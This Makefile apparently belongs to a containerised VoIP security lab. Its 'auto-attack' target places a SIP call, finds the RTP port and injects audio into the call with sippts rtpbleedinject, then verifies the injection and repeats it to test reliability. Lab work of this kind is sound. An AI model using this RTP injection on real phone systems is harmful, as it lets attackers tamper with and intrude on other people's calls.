DOCKER_COMPOSE := $(shell command -v docker-compose 2> /dev/null || echo "docker compose")

SERVICE ?=
ASTERISK_IP ?= 10.10.0.5
INJECT_REF ?= audio_inject.wav
VERIFY_NCC_THRESHOLD ?= 0.22
VERIFY_NCC_MARGIN ?= 0.12
REPEAT_RUNS ?= 20
REPEAT_DELAY_SEC ?= 2
REPEAT_LOG ?= /tmp/lab4-rtp-repeat.log
REPEAT_MIN_SUCCESS ?= $(REPEAT_RUNS)

start:
	@$(DOCKER_COMPOSE) up -d 

stop:
	@$(DOCKER_COMPOSE) down

start-wireshark:
	@docker exec -it wireshark wireshark

start-sippts:
	@docker exec -it sippts bash

start-cli-7001:
	@docker exec -it linphone-cli-7001 sh

start-cli-7002:
	@docker exec -it linphone-cli-7002 sh

cli-call:
	@docker exec linphone-cli-7001 linphone-cli-send call sip:7002@$(ASTERISK_IP)

cli-hangup:
	@docker exec linphone-cli-7001 linphone-cli-send terminate
	@docker exec linphone-cli-7002 linphone-cli-send terminate

cli-status:
	@docker exec linphone-cli-7001 linphone-cli-send calls
	@docker exec linphone-cli-7002 linphone-cli-send calls

start-baresip-7001:
	@docker exec -it baresip-cli-7001 sh

start-baresip-7002:
	@docker exec -it baresip-cli-7002 sh

baresip-call:
	@docker exec baresip-cli-7001 baresip-cli-send /dial sip:7002@$(ASTERISK_IP)

baresip-hangup:
	@docker exec baresip-cli-7001 baresip-cli-send /hangup
	@docker exec baresip-cli-7002 baresip-cli-send /hangup

baresip-status:
	@docker exec baresip-cli-7001 baresip-cli-send /listcalls
	@docker exec baresip-cli-7002 baresip-cli-send /listcalls

recordings-clean:
	@find recordings -type f \( -name '*.wav' -o -name '*.png' -o -name '*.txt' \) -delete

recordings-list:
	@find recordings -type f | sort

recording-proof:
	@./render-recording-proof.sh

recording-proof-file:
	@test -n "$(FILE)" || (echo "FILE=/path/to/file.wav is required" >&2; exit 1)
	@./render-recording-proof.sh "$(FILE)"

build:
	@$(DOCKER_COMPOSE) build $(SERVICE)


# Build analyzer container
build-analyzer:
	cd audio-analyzer && docker build -t audio-analyzer -f Dockerfile .

# Automatic verification command
verify-injection: build-analyzer
	@LATEST_WAV=$$(ls -1t recordings/*.wav | head -n 1); \
	if [ -z "$$LATEST_WAV" ]; then echo "No recording found"; exit 1; fi; \
	echo "[*] Analyzing: $$LATEST_WAV"; \
	docker run --rm \
		-e NCC_THRESHOLD=$(VERIFY_NCC_THRESHOLD) \
		-e NCC_MARGIN=$(VERIFY_NCC_MARGIN) \
		-v $$(pwd)/recordings:/recordings \
		-v $$(pwd)/$(INJECT_REF):/references/audio_inject.wav:ro \
		audio-analyzer /$$LATEST_WAV /references/audio_inject.wav


# Start the full scenario, launch the attack, then verify automatically
auto-attack: stop recordings-clean build build-analyzer start
	@echo "[*] Waiting for SIP registration (5 seconds)..."
	@sleep 5
	@echo "[*] Starting Baresip call..."
	@$(MAKE) baresip-call
	@echo "[*] Detecting RTP destination port..."
	@PORT=$$(SRC_IP=$(ASTERISK_IP) ./get-attack-cmd.sh --port-only); \
	if [ -z "$$PORT" ]; then \
		echo "[!] Failed: RTP port not found."; exit 1; \
	fi; \
	echo "[+] Intercepted port: $$PORT. Launching injection..."; \
	docker exec -it sippts sippts rtpbleedinject -i $(ASTERISK_IP) -r $$PORT -f /audio_inject.wav -p 0
	@echo "[*] Waiting 3 seconds to ensure audio is written to recording..."
	@sleep 3
	@echo "[*] Hanging up Baresip call..."
	@$(MAKE) baresip-hangup
	@echo "[*] Running audio analyzer verification..."
	@$(MAKE) verify-injection
	@echo "[+] Auto-attack completed and verification finished."

repeat-check:
	@echo "[*] RTP injection repetition test"
	@echo "[*] runs=$(REPEAT_RUNS) min_success=$(REPEAT_MIN_SUCCESS) delay=$(REPEAT_DELAY_SEC)s"
	@echo "[*] log=$(REPEAT_LOG)"
	@rm -f "$(REPEAT_LOG)"
	@PASS=0; FAIL=0; i=1; \
	while [ $$i -le "$(REPEAT_RUNS)" ]; do \
		echo "========== RUN $$i/$(REPEAT_RUNS) ==========" | tee -a "$(REPEAT_LOG)"; \
		if $(MAKE) --no-print-directory auto-attack \
			ASTERISK_IP="$(ASTERISK_IP)" \
			INJECT_REF="$(INJECT_REF)" \
			VERIFY_NCC_THRESHOLD="$(VERIFY_NCC_THRESHOLD)" \
			VERIFY_NCC_MARGIN="$(VERIFY_NCC_MARGIN)" \
			>> "$(REPEAT_LOG)" 2>&1; then \
			PASS=$$((PASS+1)); \
			echo "[RUN $$i] PASS ($$PASS pass / $$FAIL fail)" | tee -a "$(REPEAT_LOG)"; \
		else \
			FAIL=$$((FAIL+1)); \
			echo "[RUN $$i] FAIL ($$PASS pass / $$FAIL fail)" | tee -a "$(REPEAT_LOG)"; \
		fi; \
		if [ $$i -lt "$(REPEAT_RUNS)" ]; then \
			sleep "$(REPEAT_DELAY_SEC)"; \
		fi; \
		i=$$((i+1)); \
	done; \
	echo "========== SUMMARY ==========" | tee -a "$(REPEAT_LOG)"; \
	echo "total=$(REPEAT_RUNS) pass=$$PASS fail=$$FAIL min_success=$(REPEAT_MIN_SUCCESS)" | tee -a "$(REPEAT_LOG)"; \
	if [ "$$PASS" -ge "$(REPEAT_MIN_SUCCESS)" ]; then \
		echo "[+] Condition satisfied."; \
		exit 0; \
	else \
		echo "[!] Condition NOT satisfied. Check $(REPEAT_LOG) for details."; \
		exit 1; \
	fi
